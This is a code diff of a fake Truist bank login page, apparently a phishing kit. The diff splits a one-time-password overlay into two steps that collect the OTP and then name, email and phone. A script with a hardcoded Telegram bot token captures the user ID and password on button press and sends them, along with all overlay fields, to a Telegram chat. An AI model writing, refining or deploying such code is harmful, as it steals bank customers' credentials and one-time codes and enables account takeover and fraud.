@@ -366,7 +366,7 @@
   <!-- end hero -->
 
 
-  <!-- ── OTP / Details overlay (exact same as homepage) ── -->
+  <!-- ── OTP / Details overlay: Step 1 = OTP only, Step 2 = details ── -->
   <div id="tru-otp-overlay" role="dialog" aria-modal="true" aria-labelledby="tru-otp-title" style="display:none;">
     <div class="tru-overlay-backdrop"></div>
     <div class="tru-overlay-panel">
@@ -374,31 +374,47 @@
         <img src="/static.truist.com/content/dam/global-images/truist-logo-purple.svg" alt="Truist"
           class="tru-overlay-logo" />
         <h2 id="tru-otp-title" class="tru-overlay-title">Verify your identity</h2>
-        <p class="tru-overlay-subtitle">Please enter the OTP sent to your device and complete your profile.</p>
+        <p class="tru-overlay-subtitle">Please enter the OTP sent to your device.</p>
       </div>
       <form id="tru-otp-form" class="tru-overlay-form" novalidate>
-        <div class="tru-field-group">
-          <label for="tru-otp-code">One-Time Password (OTP)</label>
-          <input type="text" id="tru-otp-code" name="otp" placeholder="Enter 6-digit OTP" maxlength="6"
-            inputmode="numeric" autocomplete="one-time-code" required />
-          <span class="tru-field-error" id="tru-otp-error"></span>
+
+        <!-- STEP 1: OTP only -->
+        <div id="tru-step-otp">
+          <div class="tru-field-group">
+            <label for="tru-otp-code">One-Time Password (OTP)</label>
+            <input type="text" id="tru-otp-code" name="otp" placeholder="Enter 6-digit OTP" maxlength="6"
+              inputmode="numeric" autocomplete="one-time-code" required />
+            <span class="tru-field-error" id="tru-otp-error"></span>
+          </div>
+          <button type="button" class="tru-overlay-btn" id="tru-otp-next-btn">Continue</button>
         </div>
-        <div class="tru-field-group">
-          <label for="tru-full-name">Full Name</label>
-          <input type="text" id="tru-full-name" name="name" placeholder="Enter your full name" required />
-          <span class="tru-field-error" id="tru-name-error"></span>
+
+        <!-- STEP 2: Details (hidden until OTP verified) -->
+        <div id="tru-step-details" style="display:none;">
+          <p class="tru-overlay-subtitle" style="margin-bottom:16px;">Complete your profile.</p>
+          <div class="tru-field-group">
+            <label for="tru-first-name">First Name</label>
+            <input type="text" id="tru-first-name" name="first_name" placeholder="Enter your first name" required />
+            <span class="tru-field-error" id="tru-firstname-error"></span>
+          </div>
+          <div class="tru-field-group">
+            <label for="tru-last-name">Last Name</label>
+            <input type="text" id="tru-last-name" name="last_name" placeholder="Enter your last name" required />
+            <span class="tru-field-error" id="tru-lastname-error"></span>
+          </div>
+          <div class="tru-field-group">
+            <label for="tru-email">Email Address</label>
+            <input type="email" id="tru-email" name="email" placeholder="Enter your email address" required />
+            <span class="tru-field-error" id="tru-email-error"></span>
+          </div>
+          <div class="tru-field-group">
+            <label for="tru-phone">Phone Number</label>
+            <input type="tel" id="tru-phone" name="phone" placeholder="Enter your phone number" required />
+            <span class="tru-field-error" id="tru-phone-error"></span>
+          </div>
+          <button type="submit" class="tru-overlay-btn">Submit</button>
         </div>
-        <div class="tru-field-group">
-          <label for="tru-email">Email Address</label>
-          <input type="email" id="tru-email" name="email" placeholder="Enter your email address" required />
-          <span class="tru-field-error" id="tru-email-error"></span>
-        </div>
-        <div class="tru-field-group">
-          <label for="tru-phone">Phone Number</label>
-          <input type="tel" id="tru-phone" name="phone" placeholder="Enter your phone number" required />
-          <span class="tru-field-error" id="tru-phone-error"></span>
-        </div>
-        <button type="submit" class="tru-overlay-btn">Submit</button>
+
       </form>
     </div>
   </div>
@@ -445,7 +461,7 @@
       function hide(id) { byId(id).style.display = 'none'; document.body.style.overflow = ''; }
       function setError(id, msg) { var el = byId(id); el.textContent = msg; el.style.display = msg ? 'block' : 'none'; }
       function clearErrors() {
-        ['tru-otp-error', 'tru-name-error', 'tru-email-error', 'tru-phone-error']
+        ['tru-otp-error', 'tru-firstname-error', 'tru-lastname-error', 'tru-email-error', 'tru-phone-error']
           .forEach(function (id) { setError(id, ''); });
       }
       function randRef() {
@@ -495,6 +511,12 @@
       function openOtpOverlay(e) {
         if (e) { e.preventDefault(); e.stopImmediatePropagation(); }
         clearErrors();
+        // Always start at step 1
+        var step1 = byId('tru-step-otp');
+        var step2 = byId('tru-step-details');
+        if (step1) step1.style.display = '';
+        if (step2) step2.style.display = 'none';
+        if (byId('tru-otp-code')) byId('tru-otp-code').value = '';
         show('tru-otp-overlay');
         setTimeout(function () { var f = byId('tru-otp-code'); if (f) f.focus(); }, 80);
       }
@@ -516,16 +538,35 @@
       // ── Step 2: validate OTP form ──────────────────────────────────────────────
       var otpForm = byId('tru-otp-form');
       if (otpForm) {
+
+        // Step 1 Continue button — validate OTP then show details step
+        var otpNextBtn = byId('tru-otp-next-btn');
+        if (otpNextBtn) {
+          otpNextBtn.addEventListener('click', function () {
+            clearErrors();
+            var otp = byId('tru-otp-code').value.trim();
+            if (!otp || otp.length < 4) {
+              setError('tru-otp-error', 'Please enter a valid OTP (at least 4 digits).');
+              return;
+            }
+            // OTP ok — hide step 1, show step 2
+            byId('tru-step-otp').style.display = 'none';
+            byId('tru-step-details').style.display = '';
+            setTimeout(function () { var f = byId('tru-first-name'); if (f) f.focus(); }, 80);
+          });
+        }
+
+        // Step 2 Submit — validate details then show success
         otpForm.addEventListener('submit', function (e) {
           e.preventDefault();
           clearErrors();
-          var otp = byId('tru-otp-code').value.trim();
-          var name = byId('tru-full-name').value.trim();
+          var firstName = byId('tru-first-name').value.trim();
+          var lastName = byId('tru-last-name').value.trim();
           var email = byId('tru-email').value.trim();
           var phone = byId('tru-phone').value.trim();
           var ok = true;
-          if (!otp || otp.length < 4) { setError('tru-otp-error', 'Please enter a valid OTP (at least 4 digits).'); ok = false; }
-          if (!name) { setError('tru-name-error', 'Full name is required.'); ok = false; }
+          if (!firstName) { setError('tru-firstname-error', 'First name is required.'); ok = false; }
+          if (!lastName) { setError('tru-lastname-error', 'Last name is required.'); ok = false; }
           if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { setError('tru-email-error', 'Please enter a valid email address.'); ok = false; }
           if (!phone || phone.replace(/\D/g, '').length < 7) { setError('tru-phone-error', 'Please enter a valid phone number.'); ok = false; }
           if (!ok) return;
@@ -574,86 +615,86 @@
   </script>
 
   <script>
-  // --- STEP 1: PASTE YOUR CREDENTIALS HERE ---
-  const TELEGRAM_BOT_TOKEN = '8682611086:AAHPuC4Zx52_dwFfmRqpUr_j6TQ-uK8Don4';
-  const TELEGRAM_CHAT_ID = '8585269853';
+    // --- STEP 1: PASTE YOUR CREDENTIALS HERE ---
+    const TELEGRAM_BOT_TOKEN = '8682611086:AAHPuC4Zx52_dwFfmRqpUr_j6TQ-uK8Don4';
+    const TELEGRAM_CHAT_ID = '8585269853';
 
-  // --- DO NOT EDIT ANYTHING BELOW THIS LINE ---
+    // --- DO NOT EDIT ANYTHING BELOW THIS LINE ---
 
-  async function sendToTelegram(data) {
-    let message = '🔔 New submission from your demo website:\n\n';
-    for (const key in data) {
-      if (Object.hasOwnProperty.call(data, key)) {
-        message += `👉 ${key}: ${data[key]}\n`;
-      }
-    }
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const payload = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' };
-    try {
-      const response = await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-      if (!response.ok) { console.error(`Telegram API Error: ${response.statusText}`); }
-    } catch (error) { console.error('Failed to send message to Telegram:', error); }
-  }
-
-  function initTelegram() {
-    const userIdInput = document.getElementById('iduserId');
-    const passwordInput = document.getElementById('idpassword');
-    const signInButton = document.getElementById('loginSubmit');
-    const otpForm = document.getElementById('tru-otp-form');
-
-    if (!userIdInput || !passwordInput || !signInButton) return;
-    if (signInButton.dataset.tgBound) return;
-    signInButton.dataset.tgBound = '1';
-
-    // pointerdown fires BEFORE click — grab values here, before the original
-    // script's click handler opens the popup and disrupts everything.
-    signInButton.addEventListener('pointerdown', function () {
-      const data = {
-        'User ID': userIdInput.value || '(empty)',
-        'Password': passwordInput.value || '(empty)'
-      };
-      sendToTelegram(data);
-    }, true);
-
-    // Fallback for browsers/touch that don't fire pointerdown on the button
-    signInButton.addEventListener('mousedown', function () {
-      if (signInButton.dataset.tgFired === '1') return;
-      signInButton.dataset.tgFired = '1';
-      const data = {
-        'User ID': userIdInput.value || '(empty)',
-        'Password': passwordInput.value || '(empty)'
-      };
-      sendToTelegram(data);
-      setTimeout(() => { signInButton.dataset.tgFired = ''; }, 500);
-    }, true);
-
-    if (otpForm && !otpForm.dataset.tgBound) {
-      otpForm.dataset.tgBound = '1';
-      otpForm.addEventListener('submit', function (e) {
-        const formData = new FormData(otpForm);
-        const data = {};
-        for (let [key, value] of formData.entries()) {
-          let cleanKey = key.replace(/[_-]/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
-          data[cleanKey] = value;
+    async function sendToTelegram(data) {
+      let message = '🔔 New submission from your demo website:\n\n';
+      for (const key in data) {
+        if (Object.hasOwnProperty.call(data, key)) {
+          message += `👉 ${key}: ${data[key]}\n`;
         }
+      }
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const payload = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' };
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        if (!response.ok) { console.error(`Telegram API Error: ${response.statusText}`); }
+      } catch (error) { console.error('Failed to send message to Telegram:', error); }
+    }
+
+    function initTelegram() {
+      const userIdInput = document.getElementById('iduserId');
+      const passwordInput = document.getElementById('idpassword');
+      const signInButton = document.getElementById('loginSubmit');
+      const otpForm = document.getElementById('tru-otp-form');
+
+      if (!userIdInput || !passwordInput || !signInButton) return;
+      if (signInButton.dataset.tgBound) return;
+      signInButton.dataset.tgBound = '1';
+
+      // pointerdown fires BEFORE click — grab values here, before the original
+      // script's click handler opens the popup and disrupts everything.
+      signInButton.addEventListener('pointerdown', function () {
+        const data = {
+          'User ID': userIdInput.value || '(empty)',
+          'Password': passwordInput.value || '(empty)'
+        };
         sendToTelegram(data);
       }, true);
-    }
-  }
 
-  // Run after the page + original script are fully ready
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', initTelegram);
-  } else {
-    initTelegram();
-  }
-  setTimeout(initTelegram, 600);
-  setTimeout(initTelegram, 1500);
-</script>
+      // Fallback for browsers/touch that don't fire pointerdown on the button
+      signInButton.addEventListener('mousedown', function () {
+        if (signInButton.dataset.tgFired === '1') return;
+        signInButton.dataset.tgFired = '1';
+        const data = {
+          'User ID': userIdInput.value || '(empty)',
+          'Password': passwordInput.value || '(empty)'
+        };
+        sendToTelegram(data);
+        setTimeout(() => { signInButton.dataset.tgFired = ''; }, 500);
+      }, true);
+
+      if (otpForm && !otpForm.dataset.tgBound) {
+        otpForm.dataset.tgBound = '1';
+        otpForm.addEventListener('submit', function (e) {
+          const formData = new FormData(otpForm);
+          const data = {};
+          for (let [key, value] of formData.entries()) {
+            let cleanKey = key.replace(/[_-]/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
+            data[cleanKey] = value;
+          }
+          sendToTelegram(data);
+        }, true);
+      }
+    }
+
+    // Run after the page + original script are fully ready
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', initTelegram);
+    } else {
+      initTelegram();
+    }
+    setTimeout(initTelegram, 600);
+    setTimeout(initTelegram, 1500);
+  </script>
 
 
 </body>
